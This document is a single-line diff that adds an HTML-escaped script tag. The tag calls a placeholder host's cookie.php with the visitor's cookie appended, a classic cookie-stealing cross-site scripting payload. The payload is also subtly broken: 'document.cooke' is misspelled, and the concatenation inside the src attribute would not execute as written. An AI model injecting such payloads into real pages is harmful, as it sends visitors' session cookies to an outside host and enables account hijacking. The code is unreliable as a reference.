@@ -1,0 +1,1 @@
+&lt;script language=&#039;Javascript&#039; src=&#039;http://www.example.com/cookie.php?cookie=&#039;+document.cooke&gt;&lt;/script&gt;
